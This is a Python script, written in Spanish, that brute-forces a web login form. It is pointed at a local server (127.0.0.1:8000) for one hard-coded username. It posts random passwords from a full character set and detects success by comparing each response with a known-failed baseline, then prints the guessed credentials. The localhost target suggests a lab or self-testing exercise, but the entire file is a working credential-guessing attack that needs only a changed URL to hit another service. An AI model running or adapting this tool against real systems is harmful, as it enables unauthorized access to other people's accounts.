import sys
import string
import random

import requests

URL = "http://127.0.0.1:8000/login"
CAMPO_USUARIO = "u"
CAMPO_PASS = "password"

USUARIOS = [
    "51066056",
]

CHARSET = string.digits + string.ascii_letters + string.punctuation
LARGO_MIN = 1
LARGO_MAX = 9


def respuesta(usuario, password):
    try:
        return requests.post(
            URL,
            data={CAMPO_USUARIO: usuario, CAMPO_PASS: password},
            timeout=5,
        )
    except requests.exceptions.ConnectionError:
        print(f"[error] no me puedo conectar a {URL} -- esta levantado tu server?")
        sys.exit(1)


def firma(r):
    return (r.status_code, len(r.text), r.url, tuple(sorted(r.cookies.keys())))


def baseline(usuario):
    r = respuesta(usuario, "ESTO_SEGURO_ESTA_MAL_9z7xQ")
    return firma(r)


def buscar_random(usuario, base):
    intentos = 0
    while True:
        largo = random.randint(LARGO_MIN, LARGO_MAX)
        pw = "".join(random.choices(CHARSET, k=largo))
        intentos += 1
        r = respuesta(usuario, pw)
        print(f"  intento {intentos:>8}: {pw!r}")
        if firma(r) != base:
            return pw, intentos


def main():
    for usuario in USUARIOS:
        print(f"[cliente] usuario {usuario}")
        base = baseline(usuario)
        print(f"[cliente] huella de login INCORRECTO: {base}")
        print(f"[cliente] empezando a probar al azar...\n")
        pw, intentos = buscar_random(usuario, base)
        print(f"\n[cliente] >>> ADIVINADA en {intentos} intentos  ->  usuario: {usuario}   contrasena: {pw}")


if __name__ == "__main__":
    main()
    input("\nPresiona Enter para salir...")
